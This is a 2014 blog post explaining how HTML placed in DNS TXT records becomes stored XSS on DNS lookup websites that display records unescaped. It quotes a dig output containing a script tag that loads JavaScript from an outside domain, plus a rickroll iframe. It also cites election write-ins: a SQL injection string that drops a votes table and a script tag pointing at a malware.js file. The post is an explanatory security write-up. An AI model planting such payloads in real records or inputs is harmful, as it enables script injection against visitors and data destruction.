---
disqus: true
layout: post
title:  XSS with DNS TXT records
date:   2014-09-19
categories: security
---

Last night I ran into a clever little exploit using XSS (Cross site scripting
for you newbies, [Wikipedia](http://en.wikipedia.org/wiki/Cross-site_scripting)
has a whole article about it).

DNS has multiple record types. A (direct IP pointing), NS (name server settings), MX (e-mail config)
and CNAME (replicate another host) being a few of the more common ones.

And then we have the TXT records. They can be used for almost everything,
and are commonly used to verify sites on google and set extra e-mail headers
for verifying that you own a domain for example.

And now a guy named Jamie Hankins thought that this may be used for doing some
clever stuff. Specifically to all those sites that display your DNS data and
earn money on ads.

Here are an extract from Jamie's DNS records:

{% highlight ruby %}
dig jamiehankins.co.uk txt

;; ANSWER SECTION:
jamiehankins.co.uk.	299	IN	TXT	"google-site-verification=nZUP4BagJAjQZO6AImXyzJZBXBf9s1FbDZr8pzNLTCI"
jamiehankins.co.uk.	299	IN	TXT	"v=spf1 include:spf.mandrillapp.com ?all"
jamiehankins.co.uk.	299	IN	TXT	"<script src='//peniscorp.com/topkek.js'></script>"
jamiehankins.co.uk.	299	IN	TXT	"<iframe width='420' height='315' src='//www.youtube.com/embed/dQw4w9WgXcQ?autoplay=0' frameborder='0' allowfullscreen></iframe>"
{% endhighlight %}

As you can see he gives you back a few TXT records. One of them includes an
embedded version of the Harlem Shake video and a suspect javascript.

This is not an error in the DNS protoctol. They should be able to handle text
like that. The problem lies with the DNS tool websites that display this without
treating it as text - and simply embedding it on their site. The snippets above
gets evaluated as HTML and you can rick-roll (Harlem-shake?) everyone.

Here is an example (may be fixed when you read this)
[who.is/dns/jamiehankins.co.uk](http://who.is/dns/jamiehankins.co.uk)

## What can we learn from this?

Never expect external data to be safe. I know it is easy to overlook things
like this. I mean, DNS records are supposed to be _safe and boring_, right?

XSS exploits are used in the most strange places. For example, in the last two
Swedish Elections there have been more or less serious attempts to vote for
parties like

{% highlight html %}
'; DROP TABLE votes'
{% endhighlight %}

and

{% highlight html %}
script src="example.org/malware.js"
{% endhighlight %}

Sanitize your inputs, boys and girls.
